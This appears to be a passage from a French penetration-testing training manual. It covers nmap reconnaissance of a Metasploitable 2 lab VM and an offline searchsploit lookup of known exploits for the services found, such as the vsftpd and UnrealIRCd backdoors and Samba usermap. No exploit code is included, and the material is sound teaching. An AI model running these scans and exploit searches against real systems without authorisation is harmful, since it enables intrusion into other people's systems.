| Contrôle défensif | Filtrage réseau, segmentation, journalisation des connexions |
| Détection | Connexions TCP vers de nombreux ports depuis un même hôte |

### 6.3 Prérequis

- Kali démarré, interface `eth0` en `192.168.56.101/24`.
- Metasploitable 2 démarré, `192.168.56.103`.
- `nmap` installé sur Kali. Version testée : `7.991`. La version `7.94SVN` de l'hôte produit les mêmes sorties pour les commandes de ce lab.
- Mot de passe `sudo` de `kali` disponible. Sans root, utilisez le fallback `-sT` décrit à l'étape 9.
- Répertoire de travail : `preuves/ch1-lab1/`.

> **Rappel** — La fonction `prouve` est définie en section 2.1. Si vous avez ouvert un nouveau terminal Kali, rechargez-la avant de continuer :
>
> ```bash
> cd /home/kali
> source /home/kali/prouve.sh   # méthode 1
> # ou : source ~/.bashrc       # méthode 2
> type prouve
> ```
>
> Avec la méthode 3, la commande `/usr/local/bin/prouve` est déjà dans le `PATH` : ne la sourcez pas. Ne lancez jamais `./prouve.sh` : la fonction serait définie dans un shell enfant et disparaîtrait au retour. Vérifiez que `type prouve` répond `prouve est une fonction` (méthodes 1 et 2).

### 6.4 Étapes

**Étape 1** — Vérifier l'identité réseau de Kali.

```bash
prouve preuves/ch1-lab1/kali-ip.txt ip -br a
prouve preuves/ch1-lab1/kali-route.txt ip route
prouve preuves/ch1-lab1/kali-neigh.txt ip neigh
```

Résultat attendu (extrait réel) :

```text
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             192.168.56.101/24 fe80::a00:27ff:fea1:1771/64

192.168.56.0/24 dev eth0 proto kernel scope link src 192.168.56.101 metric 100
```

**Explication de la commande** — `ip -br a` montre `eth0 UP 192.168.56.101/24`. La route est directement connectée : `192.168.56.0/24 dev eth0`. Aucune passerelle par défaut n'est nécessaire. Piège courant : confondre l'adresse `.1` de l'hôte avec une passerelle absente. Ici, l'hôte est joignable sur le même L2, sans routage.

**Étape 2** — Vérifier la connectivité vers la cible.

```bash
prouve preuves/ch1-lab1/ping-103.txt ping -c 3 -W 2 192.168.56.103
```

Résultat attendu :

```text
3 packets transmitted, 3 received, 0% packet loss, time 2024ms
rtt min/avg/max/mdev = 0.372/0.408/0.431/0.026 ms
```

**Explication de la commande** — Le ping renvoie `ttl=64`, ce qui est cohérent avec un noyau Linux. Le RTT inférieur à 1 ms confirme un réseau local virtualisé. Le ping ne prouve pas que les services sont actifs : il prouve seulement que la pile IP répond.

**Étape 3** — Découvrir les hôtes du réseau host-only.

```bash
sudo -n true 2>/dev/null || echo "sudo demandera le mot de passe"
prouve preuves/ch1-lab1/nmap-sn.txt bash -c "echo kali | sudo -S -p '' nmap -sn -n 192.168.56.0/24"
```

Résultat attendu (extrait réel) :

```text
Nmap scan report for 192.168.56.1
Nmap scan report for 192.168.56.100
Nmap scan report for 192.168.56.103
Nmap scan report for 192.168.56.101
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.28 seconds
```

Observez `.100` : c'est l'adresse du service DHCP host-only de VirtualBox. Il peut répondre même lorsque le DHCP est désactivé dans la configuration de l'interface. `.102` et `.104` sont absents : les VM Windows ne sont pas déployées.

**Explication de la commande** — Quatre adresses répondent. `.1` est l'hôte, `.101` Kali, `.103` Metasploitable 2, `.100` le service DHCP host-only de VirtualBox. `.100` répond même avec le DHCP désactivé : ne l'ajoutez pas à la cible. `.102` et `.104` sont absents ; les étapes Windows sont `N/A`.

**Étape 4** — Scanner tous les ports TCP de la cible.

```bash
prouve preuves/ch1-lab1/nmap-allports.txt bash -c "echo kali | sudo -S -p '' \
  nmap -sS -n -p- --min-rate 1000 \
  -oA preuves/ch1-lab1/nmap-allports 192.168.56.103"
```

Résultat attendu (extrait réel) :

```text
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
1099/tcp  open  rmiregistry
1524/tcp  open  ingreslock
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
3306/tcp  open  mysql
3632/tcp  open  distccd
5432/tcp  open  postgresql
5900/tcp  open  vnc
6000/tcp  open  X11
6667/tcp  open  irc
6697/tcp  open  irc
8009/tcp  open  ajp13
8180/tcp  open  http
8787/tcp  open  drb
```

Le scan complet révèle aussi des ports RMI éphémères (`34400`, `36895`, `45883`, `54742`). Ils changent au redémarrage : ne les codez pas en dur dans un plan.

**Explication de la commande** — Le scan `-p-` trouve 30 ports ouverts. Les ports `34400`, `36895`, `45883` et `54742` sont des ports RMI/mountd éphémères. Ils peuvent changer après redémarrage. Piège courant : considérer `1524/tcp` comme un service légitime ; c'est un shell root exposé par Metasploitable 2, à documenter sans l'utiliser.

**Étape 5** — Identifier les versions des services.

```bash
prouve preuves/ch1-lab1/nmap-versions.txt bash -c "echo kali | sudo -S -p '' \
  nmap -sS -n -sV \
  -p 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787 \
  -oA preuves/ch1-lab1/nmap-versions 192.168.56.103"
```

Résultat attendu (extrait réel) :

```text
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
6697/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
```

La version PostgreSQL est affichée sous forme de plage `8.3.0 - 8.3.7`. La version exacte (`8.3.1`) sera obtenue par le client `psql` au Lab-05.

**Explication de la commande** — Les versions sont identifiées par signatures. `139/tcp` affiche `Samba smbd 3.X - 4.X`, alors que `445/tcp` affiche `3.0.20-Debian`. La version précise est celle de `445`. `5432/tcp` affiche une plage ; la version exacte sera lue avec `psql`. `6000/tcp` affiche `access denied` : le service X11 répond, mais refuse la connexion non authentifiée. Ce n'est pas un port fermé.

**Étape 6** — Détecter le système d'exploitation.

```bash
prouve preuves/ch1-lab1/nmap-os.txt bash -c "echo kali | sudo -S -p '' \
  nmap -O -n --osscan-guess -p 22,80 192.168.56.103"
```

Résultat attendu (extrait réel) :

```text
Aggressive OS guesses: Linux 2.6.9 - 2.6.33 (97%), Linux 2.6.22 (97%), ...
No exact OS matches for host (test conditions non-ideal).
```

Nmap ne trouve pas de correspondance exacte. La conclusion correcte est « noyau Linux 2.6.x probable », pas « kernel 2.6.24 confirmé ». La version exacte du noyau sera lue dans la VM au Lab-04.

**Explication de la commande** — Nmap propose `Linux 2.6.9 - 2.6.33 (97%)` et `Linux 2.6.22 (97%)`, puis `No exact OS matches`. La formulation correcte est « noyau Linux 2.6.x probable, version exacte non confirmée ». Piège courant : recopier `2.6.24` dans le rapport sans l'avoir lu dans la VM.

**Étape 7** — Exécuter les scripts NSE de découverte.

```bash
prouve preuves/ch1-lab1/nmap-nse-a.txt bash -c "echo kali | sudo -S -p '' \
  nmap -sS -n -sV -p 21,22,23,25,53,80,111 \
  --script ftp-anon,ssh2-enum-algos,ssh-hostkey,smtp-commands,http-title,http-headers,http-enum,rpcinfo \
  --script-timeout 60s --host-timeout 240s 192.168.56.103"

prouve preuves/ch1-lab1/nmap-nse-b.txt bash -c "echo kali | sudo -S -p '' \
  nmap -sS -n -sV -p 139,445,2049,3306,5900,6667,1099 \
  --script smb-os-discovery,smb-enum-shares,nfs-showmount,mysql-info,vnc-info,irc-info,rmi-dumpregistry \
  --script-timeout 60s --host-timeout 240s 192.168.56.103"
```

Résultats attendus (extraits réels) :

```text
21/tcp  open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

80/tcp  open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
| http-enum:
|   /tikiwiki/: Tikiwiki
|   /test/: Test page
|   /phpinfo.php: Possible information file
|   /phpMyAdmin/: phpMyAdmin
|_  /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'

445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|_  FQDN: metasploitable.localdomain
| smb-enum-shares:
|   \\192.168.56.103\IPC$:
|     Anonymous access: READ/WRITE
|_  \\192.168.56.103\tmp:
|     Anonymous access: READ/WRITE

3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 10
|_  Version: 5.0.51a-3ubuntu5

5900/tcp open  vnc     VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|_  Security types: VNC Authentication (2)
```

Deux scripts ne produisent aucune sortie exploitable dans cet environnement : `nfs-showmount` et `rmi-dumpregistry`. Ce n'est pas une preuve d'absence de service. Le Lab-05 utilise `showmount -e` et `rpcinfo -p` pour NFS, et documente la limite pour RMI.

**Explication de la commande** — `ftp-anon` confirme le login anonyme (code 230). `http-enum` liste `/tikiwiki/`, `/test/`, `/phpinfo.php`, `/phpMyAdmin/`, `/doc/`, `/icons/`, `/index/`. `smb-os-discovery` donne `Samba 3.0.20-Debian` et `smb-enum-shares` montre `IPC$` et `tmp` en `READ/WRITE` anonyme. `mysql-info` donne `5.0.51a-3ubuntu5`. `vnc-info` donne le protocole `3.3` et `VNC Authentication (2)`. `nfs-showmount` et `rmi-dumpregistry` ne produisent rien : l'explication ne doit pas inventer de sortie. Pour NFS, `showmount -e` (Lab-05) donnera `/ *`.

**Étape 8** — Vérifier que les scripts NSE sont disponibles avant de les utiliser.

```bash
prouve preuves/ch1-lab1/nmap-nse-help.txt nmap --script-help ftp-anon,ssh2-enum-algos,ssh-hostkey,smtp-commands,http-title,http-headers,http-enum,rpcinfo,smb-os-discovery,smb-enum-shares,nfs-showmount,mysql-info,vnc-info,irc-info,rmi-dumpregistry
```

Résultat attendu : une section `ftp-anon` suivie de la description du script, puis les sections des autres scripts. Si un script est absent, Nmap affiche `No such script`. Dans notre test, les 15 scripts sont présents sur Kali (`612` scripts installés).

**Explication de la commande** — `nmap --script-help` affiche la description de chaque script. Si un script manque, la commande affiche `No such script` et le lab doit être adapté. La vérification évite un faux négatif : un script absent ne produit aucune sortie, ce qui ressemble à un service non vulnérable.

**Étape 9** — Tester les cas d'erreur et le fallback non-root.

Sur l'hôte, sans root :

```bash
nmap -sS -n -p 22 192.168.56.101
```

Résultat attendu :

```text
You requested a scan type which requires root privileges.
QUITTING!
# rc=1
```

Fallback autorisé :

```bash
nmap -sT -n -p 22 192.168.56.101
```

Sur Kali, sans l'option `-n`, le scan SYN peut échouer :

```text
nmap: massdns.cc:763: bool DNS::ResolverImpl::resolve_nsock(): Assertion 'new_reqs.empty()' failed.
# rc=134
```

Conclusion : utilisez toujours `-n` dans ce laboratoire, et `-sT` si vous n'avez pas root. Le crash `massdns` est un défaut de la version `7.991` avec résolution DNS ; il n'indique pas une cible hors ligne.

**Explication de la commande** — Sans root, `-sS` échoue avec `rc=1`. `-sT` fonctionne : il établit une connexion TCP complète, plus visible dans les journaux de la cible. Sur Kali, `-sS` sans `-n` crashe avec `massdns.cc:763` et `rc=134`. La correction est d'ajouter `-n`, pas de désactiver la résolution DNS globalement.

**Étape 10** — Contrôler et horodater les preuves.

```bash
grep -H '^# rc=' preuves/ch1-lab1/*.txt
sha256sum preuves/ch1-lab1/*.txt preuves/ch1-lab1/*.nmap preuves/ch1-lab1/*.xml \
  > preuves/ch1-lab1/SHA256SUMS
```

Résultat attendu : un `# rc=` par fichier, puis une liste de 32 à 64 caractères hexadécimaux par fichier.

**Explication de la commande** — `grep '^# rc='` doit retourner une ligne par preuve. `sha256sum` produit une empreinte par fichier. Piège courant : écraser une preuve avec `>` au lieu d'ajouter avec `>>` ou `tee`. Dans ce lab, chaque fichier est créé une seule fois ; si vous relancez, changez le nom ou supprimez l'ancien fichier après archivage.

**Conclusion.** Vous avez une empreinte reproductible : 4 hôtes, 30 ports, 26 versions, des scripts NSE ciblés et des limites documentées. Le Lab-02 utilise cette empreinte pour rechercher des vulnérabilités connues **hors ligne**.

### 6.5 Preuves à collecter

| Preuve | Fichier attendu | Contenu vérifié |
|---|---|---|
| Identité Kali | `kali-ip.txt`, `kali-route.txt`, `kali-neigh.txt` | adresse, route, voisin |
| Connectivité | `ping-103.txt` | 0 % de perte |
| Hôtes actifs | `nmap-sn.txt` | 4 hôtes, dont `.103` |
| Ports TCP | `nmap-allports.nmap`, `.xml`, `.gnmap` | 30 ports ouverts |
| Versions | `nmap-versions.txt` | versions des 26 ports listés |
| OS | `nmap-os.txt` | estimation + absence de correspondance exacte |
| NSE | `nmap-nse-a.txt`, `nmap-nse-b.txt` | FTP anonyme, SMB, MySQL, VNC, IRC |
| Disponibilité NSE | `nmap-nse-help.txt` | descriptions des scripts |
| Cas d'erreur | `host-nmap-sS-nonroot.txt`, `host-nmap-sT.txt` | rc=1 puis scan TCP connect |
| Empreintes | `SHA256SUMS` | intégrité des preuves |

### 6.6 Critères de réussite

- [ ] Les trois commandes de l'étape 1 sont enregistrées avec un code retour.
- [ ] `nmap -sn` affiche `.1`, `.100`, `.101`, `.103`.
- [ ] Le scan complet liste au moins 25 ports ouverts.
- [ ] Les versions de vsftpd, Samba, MySQL, PostgreSQL, distcc et UnrealIRCd sont relevées.
- [ ] La sortie OS est présentée comme une estimation, sans surinterprétation.
- [ ] Les scripts NSE sont exécutés avec `--script-timeout` et `--host-timeout`.
- [ ] Les limites de `nfs-showmount` et `rmi-dumpregistry` sont notées.
- [ ] Le fallback `-sT` est démontré.
- [ ] Toutes les preuves contiennent `# date:`, `# cmd:` et `# rc=`.

## Lab-02 — Recherche de vulnérabilités connues hors ligne

### Énoncé / Contexte

Le Lab-01 a produit une empreinte de Metasploitable 2. Ce lab transforme cette empreinte en **candidats de vulnérabilités** à l'aide de la base **Exploit-DB** copiée localement sur Kali. Aucune requête Internet n'est nécessaire : la recherche est passive, et tous les exploits sont exécutés dans le lab sans limitation (Lab-07).

**Place dans la chaîne** — après l'empreinte (Lab-01), avant la construction du plan maître (Lab-03). Ce lab qualifie des candidats, il ne les exploite pas.

**Objectifs pédagogiques** — à la fin de ce lab, vous devez être capable de :

- distinguer une recherche large d'une recherche stricte (`-s`, `-t`, `-e`) ;
- rechercher par CVE avec `--cve` et retrouver le chemin local d'un exploit avec `-p` ;
- vérifier qu'une version observée appartient bien à la plage de versions d'un titre d'exploit ;
- rejeter un candidat dont la version n'est pas dans la plage ;
- utiliser `searchsploit --nmap` pour croiser un XML Nmap avec la base locale ;
- utiliser `msfconsole search` en mode **passif**, sans `use`, `exploit` ou `run` ;
- documenter un candidat comme `validé`, `rejeté` ou `non vérifiable`.

**Plan MITRE ATT&CK**

| Élément | Valeur |
|---|---|
| Tactique | Resource Development (TA0042) |
| Technique | T1588.006 Vulnerabilities |
| Sous-technique | — |
| Source de données | Historique des commandes, journaux de build, accès à la base locale |
| Contrôle défensif | Gestion des vulnérabilités, inventaire logiciel, limitation des bases d'exploits |
| Détection | Requêtes massives dans Exploit-DB, recherche de CVE sur un poste d'administration |

**Prérequis**

- Empreinte du Lab-01 : versions vsftpd `2.3.4`, Samba `3.0.20-Debian`, UnrealIRCd `3.2.8.1`, distccd `v1`, ProFTPD `1.3.1`, MySQL `5.0.51a-3ubuntu5`, PostgreSQL `8.3.0 - 8.3.7`, Apache `2.2.8`, PHP `5.2.4`.
- `searchsploit` installé et base locale à jour au moment de la formation. Vérifiez avec `searchsploit -h`.
- `msfconsole` installé. Version testée : Metasploit Framework de Kali, recherche `vsftpd` en environ 10 secondes.
- Le fichier XML du Lab-01 : `preuves/ch1-lab1/nmap-versions.xml`. Si vous ne l'avez pas, regénérez-le avec `nmap -sV -oX`.
- Répertoire de travail : `preuves/ch1-lab2/`.

> **Périmètre du lab** — ce lab ne fait que rechercher ; tous les exploits sont développés, exécutés et testés dans le lab sans limitation (Lab-07). Les commandes `searchsploit -m`, `searchsploit -x`, `msfconsole use`, `msfconsole exploit` et `msfconsole run` sont réservées au Lab-07.

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `searchsploit` | `-h`, `-s -t`, `--cve`, `--nmap`, `-p`, `-j`, `--disable-colour` | Recherche locale Exploit-DB |
| `msfconsole` | `msfconsole -q -x 'search vsftpd; exit'` | Recherche passive de modules |
| `prouve` | `prouve preuves/ch1-lab2/... commande` | Preuve datée avec code retour |
| `grep` | `grep -E 'Exploit Title|CVE-'` | Extraction et comptage des résultats |
| `sha256sum` | `sha256sum preuves/ch1-lab2/*` | Intégrité des preuves |

### Commande et laboratoire étape par étape

#### Étape 1 — Vérifier la base locale et les options

**But** — confirmer que `searchsploit` est installé, que la base Exploit-DB locale répond et que les options utilisées dans le lab sont disponibles.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — `searchsploit` installé avec sa base locale ; fonction `prouve` chargée.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab2/searchsploit-help.txt searchsploit -h
```

**Explication de la commande**

- `prouve preuves/ch1-lab2/searchsploit-help.txt` : exécute la commande et écrit dans la preuve l'horodatage, la commande, `stdout`, `stderr` et le code retour.
- `searchsploit` : interroge la copie locale de la base Exploit-DB, sans accès Internet.
- `-h` : affiche l'aide et la liste des options.
- `rc=2` : code retour attendu de l'aide ; `searchsploit` écrit l'aide sur `stderr`, ce n'est pas un échec bloquant.
- `--disable-colour` : option à utiliser dans les preuves pour supprimer les séquences ANSI ; sans elle, les fichiers sont difficiles à lire.
- Piège courant : interpréter `rc=2` comme une base absente ou cassée ; lisez le contenu de la preuve avant de conclure.

**Résultat attendu**

L'aide s'affiche, avec les options `-s`, `-t`, `-e`, `--cve`, `--nmap`, `-p`, `-j` et `--disable-colour`.

**Preuve** — `preuves/ch1-lab2/searchsploit-help.txt`.

#### Étape 2 — Comparer recherche large et recherche stricte

**But** — mesurer la différence entre une recherche par mots-clés et une recherche limitée au titre, sur le cas vsftpd `2.3.4`.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — étape 1 terminée ; base Exploit-DB locale disponible.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab2/searchsploit-vsftpd.txt searchsploit --disable-colour vsftpd 2.3.4
prouve preuves/ch1-lab2/searchsploit-vsftpd-strict.txt searchsploit --disable-colour -s -t vsftpd 2.3.4
```

**Explication de la commande**

- `prouve ... searchsploit-vsftpd.txt` : enregistre la recherche large dans une preuve datée.
- `prouve ... searchsploit-vsftpd-strict.txt` : enregistre la recherche stricte dans une seconde preuve.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : supprime les séquences ANSI de la sortie.
- `vsftpd 2.3.4` : termes de recherche ; la base compare les mots du titre et de la description.
- `-s` : recherche stricte, qui exige que tous les termes correspondent.
- `-t` : limite la recherche au titre de l'exploit.
- Piège courant : conclure à l'absence de vulnérabilité sur un seul `No Results` ; la recherche stricte peut manquer un titre qui contient une plage de versions, comme ProFTPD à l'étape 6.

**Résultat attendu**

```text
vsftpd 2.3.4 - Backdoor Command Execution     | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Me | unix/remote/17491.rb
```

La recherche stricte retourne ici les mêmes résultats. Sur d'autres versions, elle peut renvoyer `No Results` lorsque le titre contient une plage de versions. Ce n'est pas une absence de vulnérabilité : c'est une différence de moteur de recherche.

**Preuve** — `preuves/ch1-lab2/searchsploit-vsftpd.txt` et `preuves/ch1-lab2/searchsploit-vsftpd-strict.txt`.

#### Étape 3 — Rechercher les CVE candidates

**But** — relier chaque service observé à une CVE présente dans la base locale, sans dépendre du titre de l'exploit.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — empreinte du Lab-01 ; quatre CVE candidates identifiées.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab2/searchsploit-cve-2011-2523.txt searchsploit --disable-colour --cve 2011-2523
prouve preuves/ch1-lab2/searchsploit-cve-2007-2447.txt searchsploit --disable-colour --cve 2007-2447
prouve preuves/ch1-lab2/searchsploit-cve-2010-2075.txt searchsploit --disable-colour --cve 2010-2075
prouve preuves/ch1-lab2/searchsploit-cve-2004-2687.txt searchsploit --disable-colour --cve 2004-2687
```

**Explication de la commande**

- `prouve ... searchsploit-cve-<année>-<numéro>.txt` : crée une preuve par CVE, avec date, commande, sortie et code retour.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : sortie sans séquences ANSI.
- `--cve 2011-2523` : recherche le code CVE dans les métadonnées de la base, et non dans le titre.
- Les trois autres commandes appliquent la même méthode à `CVE-2007-2447`, `CVE-2010-2075` et `CVE-2004-2687`.
- Piège courant : rechercher uniquement le nom du service ; un même service peut correspondre à plusieurs CVE et le titre de l'exploit peut ne pas contenir le code CVE.

**Résultat attendu**

| CVE | Service observé | Exploit local | Statut |
|---|---|---|---|
| CVE-2011-2523 | vsftpd 2.3.4 | `unix/remote/49757.py`, `unix/remote/17491.rb` | validé |
| CVE-2007-2447 | Samba 3.0.20-Debian | `unix/remote/16320.rb` | validé |
| CVE-2010-2075 | UnrealIRCd 3.2.8.1 | `linux/remote/16922.rb`, `linux/remote/13853.pl` | validé |
| CVE-2004-2687 | distccd v1 | `multiple/remote/9915.rb` | validé |

**Preuve** — `preuves/ch1-lab2/searchsploit-cve-2011-2523.txt`, `searchsploit-cve-2007-2447.txt`, `searchsploit-cve-2010-2075.txt` et `searchsploit-cve-2004-2687.txt`.

#### Étape 4 — Lire les métadonnées d'un exploit

**But** — vérifier le chemin local, l'URL, les codes CVE et l'état de vérification des quatre exploits principaux.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — EDB-ID `16320`, `16922`, `17491` et `9915` identifiés à l'étape 3.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab2/searchsploit-p-16320.txt searchsploit --disable-colour -p 16320
prouve preuves/ch1-lab2/searchsploit-p-16922.txt searchsploit --disable-colour -p 16922
prouve preuves/ch1-lab2/searchsploit-p-17491.txt searchsploit --disable-colour -p 17491
prouve preuves/ch1-lab2/searchsploit-p-9915.txt searchsploit --disable-colour -p 9915
```

**Explication de la commande**

- `prouve ... searchsploit-p-<id>.txt` : enregistre les métadonnées de l'exploit dans une preuve datée.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : sortie sans séquences ANSI.
- `-p 16320` : affiche les métadonnées de l'exploit `16320`, notamment son chemin local, son URL et ses codes.
- Les trois autres commandes font de même pour `16922`, `17491` et `9915`.
- `Path` : chemin local du fichier, lisible sans Internet.
- `Codes` : CVE et OSVDB associés à l'exploit.
- `Verified: True` : l'équipe Exploit-DB a vérifié l'exploit ; cela ne garantit pas qu'il fonctionne sur cette cible.
- Piège courant : copier l'exploit avec `-m` ou l'ouvrir avec `-x` ; ces options sont réservées au Lab-07.

**Résultat attendu**

```text
  Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/16320
     Path: /usr/share/exploitdb/exploits/unix/remote/16320.rb
    Codes: CVE-2007-2447, OSVDB-34700
 Verified: True
File Type: Ruby script, ASCII text
```

`Verified: True` signifie que l'équipe Exploit-DB a vérifié l'exploit. Cela ne garantit pas qu'il fonctionne sur votre cible : la version et la configuration doivent correspondre.

**Preuve** — `preuves/ch1-lab2/searchsploit-p-16320.txt`, `searchsploit-p-16922.txt`, `searchsploit-p-17491.txt` et `searchsploit-p-9915.txt`.

#### Étape 5 — Rechercher par service et version

**But** — balayer les services observés au Lab-01 et repérer les candidats dont le titre contient une version ou une plage exploitable.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — versions du Lab-01 ; base locale disponible.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab2/searchsploit-samba.txt searchsploit --disable-colour samba 3.0.20
prouve preuves/ch1-lab2/searchsploit-unrealircd.txt searchsploit --disable-colour unrealircd 3.2.8
prouve preuves/ch1-lab2/searchsploit-distcc.txt searchsploit --disable-colour distcc
prouve preuves/ch1-lab2/searchsploit-proftpd.txt searchsploit --disable-colour proftpd 1.3.1
prouve preuves/ch1-lab2/searchsploit-mysql.txt searchsploit --disable-colour mysql 5.0.51
prouve preuves/ch1-lab2/searchsploit-postgresql.txt searchsploit --disable-colour postgresql 8.3
prouve preuves/ch1-lab2/searchsploit-apache.txt searchsploit --disable-colour apache 2.2.8
prouve preuves/ch1-lab2/searchsploit-php.txt searchsploit --disable-colour php 5.2.4
prouve preuves/ch1-lab2/searchsploit-tomcat.txt searchsploit --disable-colour tomcat 5.5
prouve preuves/ch1-lab2/searchsploit-bind.txt searchsploit --disable-colour bind 9.4.2
```

**Explication de la commande**

- `prouve ... searchsploit-<service>.txt` : enregistre chaque recherche dans une preuve distincte.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : supprime les séquences ANSI.
- `samba 3.0.20` : recherche large sur le service et la version ; elle retourne aussi des titres qui ne s'appliquent pas à cette version.
- `unrealircd 3.2.8` et `distcc` : recherches sur les services identifiés au Lab-01.
- `proftpd 1.3.1`, `mysql 5.0.51`, `postgresql 8.3`, `apache 2.2.8`, `php 5.2.4`, `tomcat 5.5` et `bind 9.4.2` : recherches sur les autres services exposés.
- Piège courant : recopier tous les résultats dans la matrice sans lire la plage de versions ; `7701` (`Samba < 3.0.20`) et `36741` (DoS) ne s'appliquent pas à `3.0.20`.

**Résultat attendu**

```text
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                               | linux/remote/7701.txt

UnrealIRCd 3.2.8.1 - Backdoor Command Execution                     | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Remote Downloader/Executor                      | linux/remote/13853.pl

DistCC Daemon - Command Execution                                   | multiple/remote/9915.rb
```

Pour ProFTPD `1.3.1`, la recherche ne renvoie aucun résultat direct. Pour Apache `2.2.8`, les résultats concernent surtout le module PHP CGI (`CVE-2012-1823`), pas Apache seul. Pour BIND `9.4.2`, le résultat `BIND 9.4.1 < 9.4.2` **exclut** la version `9.4.2` : le candidat doit être rejeté. Samba `3.0.20` retourne quatre résultats ; `16320` est le candidat principal, `7701` et `36741` sont des faux positifs pour cette version.

**Preuve** — `preuves/ch1-lab2/searchsploit-samba.txt`, `searchsploit-unrealircd.txt`, `searchsploit-distcc.txt`, `searchsploit-proftpd.txt`, `searchsploit-mysql.txt`, `searchsploit-postgresql.txt`, `searchsploit-apache.txt`, `searchsploit-php.txt`, `searchsploit-tomcat.txt` et `searchsploit-bind.txt`.

#### Étape 6 — Vérifier une plage de versions et rejeter un faux positif

**But** — comparer la version observée à la plage du titre et rejeter explicitement un candidat hors plage.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — ProFTPD `1.3.1` identifié au Lab-01 ; résultat de l'étape 5.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab2/searchsploit-cve-2010-4221.txt searchsploit --disable-colour --cve 2010-4221
```

**Explication de la commande**

- `prouve ... searchsploit-cve-2010-4221.txt` : enregistre la recherche et son code retour.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : sortie sans séquences ANSI.
- `--cve 2010-4221` : recherche la CVE dans les métadonnées.
- `1.3.2 rc3 < 1.3.3b` : plage du titre ; la cible `1.3.1` est antérieure, donc hors plage.
- Piège courant : voir « ProFTPD » et « CVE » dans le même résultat, puis conclure à une vulnérabilité sans lire la plage. La même logique s'applique à BIND : `9.4.1 < 9.4.2` exclut `9.4.2`.

**Résultat attendu**

```text
ProFTPd 1.3.2 rc3 < 1.3.3b (FreeBSD) - Telnet IAC Buffer Overflow | linux/remote/16878.rb
